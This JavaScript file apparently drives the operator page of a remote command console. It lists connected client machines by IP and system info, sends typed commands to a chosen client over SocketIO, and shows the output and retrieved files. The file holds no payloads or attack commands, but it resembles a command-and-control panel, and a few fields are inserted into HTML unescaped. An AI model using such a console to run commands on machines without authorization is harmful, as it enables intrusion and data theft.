// Console-specific state
let selectedClientId = null;

// Render the clients list
function renderClients() {
    const clientsList = document.getElementById('clientsList');
    const clientCount = document.getElementById('clientCount');

    clientCount.textContent = Object.keys(clients).length;

    if (Object.keys(clients).length === 0) {
        clientsList.innerHTML = '<p class="empty-message">No clients connected</p>';
        return;
    }

    clientsList.innerHTML = '';

    Object.values(clients).forEach(client => {
        const clientCard = document.createElement('div');
        clientCard.className = 'client-card';
        if (client.client_id === selectedClientId) {
            clientCard.classList.add('active');
        }

        const displayName = client.sys_info ? escapeHtml(client.sys_info) : client.client_id;
        clientCard.innerHTML = `
            <div class="client-id">${displayName}</div>
            <div class="client-info">
                <span>IP: ${client.ip}:${client.port}</span>
                <span>Connected: ${client.connected_at}</span>
            </div>
        `;

        clientCard.addEventListener('click', () => selectClient(client.client_id));
        clientsList.appendChild(clientCard);
    });
}

// Select a client
function selectClient(clientId) {
    selectedClientId = clientId;
    renderClients();
    updateSelectedClientDisplay();
    enableCommandInput();

    // Add selection message to output
    const client = clients[clientId];
    const displayName = client.sys_info ? client.sys_info : clientId;
    addSystemMessage(`Selected client: ${displayName} (${client.ip}:${client.port})`);
}

// Update the selected client display
function updateSelectedClientDisplay() {
    const selectedClientElement = document.getElementById('selectedClient');

    if (selectedClientId && clients[selectedClientId]) {
        const client = clients[selectedClientId];
        const displayName = client.sys_info ? client.sys_info : selectedClientId;
        selectedClientElement.textContent = `${displayName} (${client.ip}:${client.port})`;
        selectedClientElement.classList.add('active');
    } else {
        selectedClientElement.textContent = 'No client selected';
        selectedClientElement.classList.remove('active');
    }
}

// Enable command input
function enableCommandInput() {
    document.getElementById('commandInput').disabled = false;
    document.getElementById('sendButton').disabled = false;
    document.getElementById('commandInput').focus();
}

// Disable command input
function disableCommandInput() {
    document.getElementById('commandInput').disabled = true;
    document.getElementById('sendButton').disabled = true;
}

// Send command to selected client
function sendCommand() {
    if (!selectedClientId) {
        addSystemMessage('Error: No client selected');
        return;
    }

    const commandInput = document.getElementById('commandInput');
    const command = commandInput.value.trim();

    if (!command) {
        return;
    }

    // Add command to output
    addCommandToOutput(command);

    // Send via SocketIO
    socket.emit('send_command', {
        client_id: selectedClientId,
        command: command
    });

    // Clear input
    commandInput.value = '';
}

// Handle command response
function handleCommandResponse(data) {
    if (!data.success) {
        addErrorToOutput(data.error || 'Unknown error');
        return;
    }

    if (data.file_download) {
        addFileDownloadToOutput(data.response, data.filename);
    } else {
        addResponseToOutput(data.response);
    }
}

// Add command to output
function addCommandToOutput(command) {
    const outputDiv = document.getElementById('commandOutput');

    // Remove welcome message if present
    const welcomeMessage = outputDiv.querySelector('.welcome-message');
    if (welcomeMessage) {
        welcomeMessage.remove();
    }

    const timestamp = new Date().toLocaleTimeString();

    const commandEntry = document.createElement('div');
    commandEntry.className = 'command-entry';
    commandEntry.innerHTML = `
        <div class="command-header">
            <span class="command-text">$ ${escapeHtml(command)}</span>
            <span class="command-time">${timestamp}</span>
        </div>
    `;

    outputDiv.appendChild(commandEntry);
    outputDiv.scrollTop = outputDiv.scrollHeight;
}

// Add response to output
function addResponseToOutput(response) {
    const outputDiv = document.getElementById('commandOutput');
    const lastEntry = outputDiv.querySelector('.command-entry:last-child');

    if (lastEntry) {
        const responseDiv = document.createElement('div');
        responseDiv.className = 'command-response';
        responseDiv.textContent = response || '(no response)';
        lastEntry.appendChild(responseDiv);
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}

// Add error to output
function addErrorToOutput(error) {
    const outputDiv = document.getElementById('commandOutput');
    const lastEntry = outputDiv.querySelector('.command-entry:last-child');

    if (lastEntry) {
        const errorDiv = document.createElement('div');
        errorDiv.className = 'command-error';
        errorDiv.textContent = `Error: ${error}`;
        lastEntry.appendChild(errorDiv);
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}

// Add file download message to output
function addFileDownloadToOutput(response, filename) {
    const outputDiv = document.getElementById('commandOutput');
    const lastEntry = outputDiv.querySelector('.command-entry:last-child');

    if (lastEntry) {
        const fileDiv = document.createElement('div');
        fileDiv.className = 'file-download';
        fileDiv.innerHTML = `
            <strong>📥 File Download Complete</strong><br>
            ${escapeHtml(response)}<br>
            <a href="/api/downloads/${encodeURIComponent(filename)}"
               download="${filename}"
               style="color: #10b981; text-decoration: underline; cursor: pointer;">
                Download ${escapeHtml(filename)}
            </a>
        `;
        lastEntry.appendChild(fileDiv);
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}

// Add system message
function addSystemMessage(message) {
    const outputDiv = document.getElementById('commandOutput');

    const timestamp = new Date().toLocaleTimeString();
    const systemEntry = document.createElement('div');
    systemEntry.className = 'command-entry';
    systemEntry.innerHTML = `
        <div class="command-header">
            <span class="command-text" style="color: #f59e0b;">⚡ ${escapeHtml(message)}</span>
            <span class="command-time">${timestamp}</span>
        </div>
    `;

    outputDiv.appendChild(systemEntry);
    outputDiv.scrollTop = outputDiv.scrollHeight;
}

// Clear output
function clearOutput() {
    const outputDiv = document.getElementById('commandOutput');
    outputDiv.innerHTML = '<div class="welcome-message"><p>Output cleared</p></div>';
}

function positionMoreCommandsMenu(detailsEl) {
    const menuEl = detailsEl.querySelector('.suggestion-more-menu');
    if (!menuEl) {
        return;
    }

    const viewportPadding = 8;
    const detailsRect = detailsEl.getBoundingClientRect();

    detailsEl.classList.remove('align-left', 'align-right');
    if (detailsRect.left > window.innerWidth / 2) {
        detailsEl.classList.add('align-right');
    } else {
        detailsEl.classList.add('align-left');
    }

    detailsEl.style.setProperty('--menu-offset-x', '0px');

    const menuRect = menuEl.getBoundingClientRect();
    let shiftX = 0;

    if (menuRect.right > window.innerWidth - viewportPadding) {
        shiftX -= menuRect.right - (window.innerWidth - viewportPadding);
    }

    if (menuRect.left + shiftX < viewportPadding) {
        shiftX += viewportPadding - (menuRect.left + shiftX);
    }

    detailsEl.style.setProperty('--menu-offset-x', `${Math.round(shiftX)}px`);
}

function setupMoreCommandsDropdown() {
    const detailsEl = document.querySelector('.suggestion-more');
    if (!detailsEl) {
        return;
    }

    const reposition = () => {
        if (detailsEl.open) {
            positionMoreCommandsMenu(detailsEl);
        }
    };

    detailsEl.addEventListener('toggle', () => {
        if (detailsEl.open) {
            requestAnimationFrame(() => positionMoreCommandsMenu(detailsEl));
        } else {
            detailsEl.style.setProperty('--menu-offset-x', '0px');
        }
    });

    window.addEventListener('resize', reposition);
}

// Callback hooks for shared.js
window.onClientConnected = (data) => {
    renderClients();
};

window.onClientDisconnected = (clientId, client) => {
    if (selectedClientId === clientId) {
        const displayName = client?.sys_info || clientId;
        selectedClientId = null;
        updateSelectedClientDisplay();
        disableCommandInput();
        addSystemMessage(`Client ${displayName} disconnected`);
    }
    renderClients();
};

window.onClientInfoUpdated = (data) => {
    renderClients();
    if (selectedClientId === data.client_id) {
        updateSelectedClientDisplay();
    }
};

window.onCommandResponse = (data) => {
    handleCommandResponse(data);
};

window.onClientsLoaded = (data) => {
    renderClients();
};

window.onPageLoad = () => {
    // Command input event listeners
    const commandInput = document.getElementById('commandInput');
    const sendButton = document.getElementById('sendButton');
    const clearButton = document.getElementById('clearButton');

    sendButton.addEventListener('click', sendCommand);
    clearButton.addEventListener('click', clearOutput);

    commandInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            sendCommand();
        }
    });

    // Quick command suggestions
    document.querySelectorAll('.suggestion-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const cmd = btn.dataset.cmd;
            commandInput.value = cmd;
            commandInput.focus();
        });
    });

    setupMoreCommandsDropdown();
};
